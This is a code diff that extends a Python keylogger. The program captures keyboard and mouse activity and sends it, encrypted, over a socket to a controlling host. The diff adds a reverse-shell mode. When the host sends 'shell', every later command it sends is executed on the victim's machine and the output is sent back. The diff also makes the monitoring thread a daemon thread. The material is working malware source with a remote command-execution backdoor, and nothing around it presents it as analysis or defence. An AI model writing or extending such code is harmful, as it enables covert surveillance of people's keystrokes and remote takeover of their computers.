@@ -129,7 +129,7 @@ class Keylogger:
                 print(e)
 
     def send_to_host(self, data):
-        encrypted_data = utils.encrypt(data)
+        encrypted_data = utils.encrypt(str.encode(data))
 
         try:
             self.sock.sendall(encrypted_data)
@@ -173,11 +173,12 @@ class Keylogger:
         mouse.on_right_click(callback=self.mouse_right_callback)
 
         t = Thread(target=self.check_foreground_window)
+        t.daemon = True
         t.start()
 
     def stop(self):
         self.active = False
-        self.send_to_host(b'terminated')
+        self.send_to_host("terminated")
         self.sock.close()
 
 
@@ -187,12 +188,24 @@ if __name__ == "__main__":
     keylogger.start()
     keylogger.connect_to_host()
 
+    reverse_shell = False
+
     while True:
         recv = keylogger.receive_from_host()
         if recv:
-            if recv == "exit":
-                keylogger.stop()
-                break
+            if reverse_shell:
+                if recv == "exit":
+                    reverse_shell = False
+                    keylogger.send_to_host("reverse shell deactivated")
+                else:
+                    keylogger.send_to_host(utils.execute_command(recv))
             else:
-                keylogger.send_to_host(b'received')
-                print(recv)
+                if recv == "exit":
+                    keylogger.stop()
+                    break
+                elif recv == "shell":
+                    reverse_shell = True
+                    keylogger.send_to_host("reverse shell activated")
+                else:
+                    keylogger.send_to_host("received")
+                    print(recv)
